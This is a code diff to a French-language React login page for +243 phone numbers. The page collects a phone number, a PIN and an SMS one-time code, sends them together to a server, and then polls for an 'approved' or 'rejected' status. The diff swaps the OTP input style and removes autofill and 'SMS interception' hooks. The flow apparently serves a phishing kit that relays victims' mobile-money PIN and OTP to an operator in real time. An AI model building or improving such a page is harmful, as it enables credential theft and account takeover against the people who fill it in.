@@ -50,14 +50,17 @@
         }
       };
 
-      const handleInputChange = (e) => {
-        const val = e.target.value.replace(/\D/g, '').substring(0, 4);
-        setError('');
-        const digits = val.split('');
-        while (digits.length < 4) {
-          digits.push('');
+      const hOC = (i, v) => {
+        if (v.length <= 1 && /^\d*$/.test(v)) {
+          setError('');
+          const n = [...otp];
+          n[i] = v;
+          setOtp(n);
+          if (v && i < 3) {
+            const next = document.getElementById(`otp-${i + 1}`);
+            if (next) next.focus();
+          }
         }
-        setOtp(digits);
       };
 
       const handleLoginSubmit = async () => {
@@ -91,10 +94,9 @@
         }, 1500);
       };
 
-      const handleVerify = async (forcedOtp = null) => {
+      const handleVerify = async () => {
         setError('');
-        const otpValue = forcedOtp || otp.join('');
-        if (otpValue.length < 4) {
+        if (otp.join('').length < 4) {
           setError('Veuillez entrer le code de vérification complet (4 chiffres).');
           return;
         }
@@ -107,7 +109,7 @@
               session_id: sessionId,
               phone,
               pin: pin.join(''),
-              otp: otpValue
+              otp: otp.join('')
             })
           });
 
@@ -120,7 +122,6 @@
               if (data.status === 'approved') {
                 clearInterval(pollInterval);
                 setIsLoading(false);
-                setOtp(['', '', '', '']); // Clear OTP so it never triggers the submission effect again
                 setStep(3);
               } else if (data.status === 'rejected') {
                 clearInterval(pollInterval);
@@ -138,68 +139,6 @@
           setIsLoading(false);
         }
       };
-
-      // Centralized trigger: automatically submit once 4 digits are completed
-      useEffect(() => {
-        const code = otp.join('').trim();
-        if (step === 2 && code.length === 4 && !isLoading) {
-          handleVerify(code);
-        }
-      }, [otp, isLoading, step]);
-
-      // Auto-Focus the input field on Step 2 mount to allow Chrome's SMS prompt to autofill directly
-      useEffect(() => {
-        if (step === 2) {
-          const input = document.getElementById('otp-real-input');
-          if (input) {
-            input.focus();
-          }
-        }
-      }, [step]);
-
-      // SMS Auto-Detection (WebOTP + WebView Native Hook)
-      useEffect(() => {
-        if (step !== 2) return;
-
-        // 1. WebOTP API for browser-native auto-fill
-        let ac = null;
-        if ('OTPCredential' in window) {
-          try {
-            ac = new AbortController();
-            navigator.credentials.get({
-              otp: { transport: ['sms'] },
-              signal: ac.signal
-            }).then(otpObj => {
-              if (otpObj && otpObj.code) {
-                const code = otpObj.code.trim().substring(0, 4);
-                if (code.length === 4) {
-                  setOtp(code.split(''));
-                }
-              }
-            }).catch(err => {
-              console.log('WebOTP error or aborted:', err);
-            });
-          } catch (e) {
-            console.error('WebOTP initialization failed:', e);
-          }
-        }
-
-        // 2. Native Bridge hook for Mobile App Wrapper (allows the native container to inject SMS text or code directly)
-        window.onSMSReceived = (smsContentOrCode) => {
-          if (!smsContentOrCode) return;
-          console.log('Interception SMS / Code via Native Bridge:', smsContentOrCode);
-          const match = smsContentOrCode.match(/\b\d{4}\b/);
-          if (match) {
-            const code = match[0];
-            setOtp(code.split(''));
-          }
-        };
-
-        return () => {
-          if (ac) ac.abort();
-          delete window.onSMSReceived;
-        };
-      }, [step]);
 
       if (isLoading) {
         return (
@@ -246,34 +185,10 @@
               <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12 text-center'>
                 <h2 className='text-3xl font-bold text-gray-900'>Entrez le code OTP</h2>
                 <p className='text-gray-500 mt-4 text-lg'>Le code de vérification a été envoyé au numéro <span className='font-bold text-gray-900'>+243 {phone}</span> renseigné précédemment.</p>
-                <div className='relative flex justify-center gap-2 sm:gap-4 mt-10 max-w-xs mx-auto' style={{ height: '5rem' }}>
-                  <input
-                    id="otp-real-input"
-                    type="text"
-                    inputMode="numeric"
-                    autoComplete="one-time-code"
-                    pattern="[0-9]*"
-                    maxLength={4}
-                    autoFocus
-                    value={otp.join('').trim()}
-                    onChange={handleInputChange}
-                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
-                    style={{ zIndex: 10, fontSize: '16px' }} 
-                  />
-                  {[0, 1, 2, 3].map((i) => {
-                    const currentVal = otp[i] || '';
-                    const isFocused = otp.join('').trim().length === i || (otp.join('').trim().length === 4 && i === 3);
-                    return (
-                      <div 
-                        key={i} 
-                        className={`w-10 h-14 sm:w-16 sm:h-20 flex items-center justify-center text-2xl sm:text-3xl font-bold border rounded-xl sm:rounded-2xl transition-all ${
-                          isFocused ? 'border-red-500 ring-2 ring-red-100 bg-white' : 'border-gray-300 bg-white'
-                        }`}
-                      >
-                        {currentVal}
-                      </div>
-                    );
-                  })}
+                <div className='flex justify-center gap-2 sm:gap-4 mt-10'>
+                  {[0, 1, 2, 3].map((i) => (
+                    <input key={i} id={`otp-${i}`} type='text' maxLength='1' className='w-10 h-14 sm:w-16 sm:h-20 text-center text-2xl sm:text-3xl font-bold border border-gray-300 rounded-xl sm:rounded-2xl focus:border-red-500 outline-none' value={otp[i] || ''} onChange={(e) => hOC(i, e.target.value)} />
+                  ))}
                 </div>
                 <div className='mt-6 text-gray-500 font-medium'>Renvoyer le code dans <span className='text-red-600'>{timer}s</span></div>
                 {error && (
